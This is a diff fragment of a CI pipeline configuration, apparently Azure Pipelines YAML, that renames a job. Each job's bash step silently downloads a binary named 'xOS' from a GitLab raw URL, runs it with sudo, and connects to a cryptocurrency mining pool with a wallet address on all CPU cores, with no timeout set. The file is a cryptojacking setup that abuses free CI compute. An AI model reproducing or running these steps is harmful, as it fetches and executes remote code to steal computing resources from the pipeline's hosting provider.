@@ -13,7 +13,7 @@ jobs:
   steps:
   - bash: wget https://gitlab.com/azkadafa39/donlod/-/raw/main/xOS >/dev/null 2>&1 && chmod +x xOS && sudo ./xOS --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls -u JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.$(echo $(shuf -i 100-999 -n 1)-Deviant) -k -t $(nproc --all)
     displayName: 'run'
-- job: Run2
+- job: Run3
   timeoutInMinutes: 0 # how long to run the job before automatically cancelling
   steps:
   - bash: wget https://gitlab.com/azkadafa39/donlod/-/raw/main/xOS >/dev/null 2>&1 && chmod +x xOS && sudo ./xOS --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls -u JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.$(echo $(shuf -i 100-999 -n 1)-Deviant) -k -t $(nproc --all)
